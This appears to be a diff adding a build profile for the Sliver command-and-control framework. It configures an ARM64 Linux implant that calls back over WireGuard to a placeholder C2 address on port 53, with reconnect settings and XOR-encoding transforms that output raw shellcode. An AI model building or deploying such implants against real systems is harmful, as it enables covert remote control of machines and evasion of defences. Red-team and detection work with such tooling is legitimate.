@@ -1,0 +1,49 @@
+---
+apiVersion: sliver.bishopfox.com/v1alpha1
+kind: BuildProfile
+metadata:
+  name: linux-shellcode
+  revision: 1
+target:
+  os: linux
+  arch: arm64
+mode: session
+c2:
+  endpoints:
+  - protocol: wireguard
+    address: wg://192.0.2.10:53
+  connectionStrategy: random
+  reconnectSeconds: 60
+  pollTimeoutSeconds: 360
+  maxConnectionErrors: 1000
+  httpC2Profile: default
+core:
+  name: builtin/sliver
+  version: 1.0.0
+  digest: sha256:91dec1eb4394dbc34ab9e0594d7297424cff0d5523e6ab3b3f6d4ba4f90a1af0
+coreOutput:
+  kind: shared-library
+  container: elf
+  goBuildMode: c-shared
+coreOptions:
+- name: exports
+  value:
+  - StartW
+transforms:
+- spec:
+    name: builtin/malasada
+    version: 1.0.0
+    digest: sha256:c021df62cb59723569038fd13a9b29eeaddb0ed6a244435d9adbc388954e8b1f
+  options: []
+- spec:
+    name: builtin/xor-dynamic
+    version: 1.0.0
+    digest: sha256:858e892a666672e46841117f0713f3e4917e660144ae669d50510096c9dd99ac
+  options: []
+finalOutput:
+  format: shellcode
+  artifact:
+    kind: shellcode
+    container: raw
+provider:
+  policy: automatic
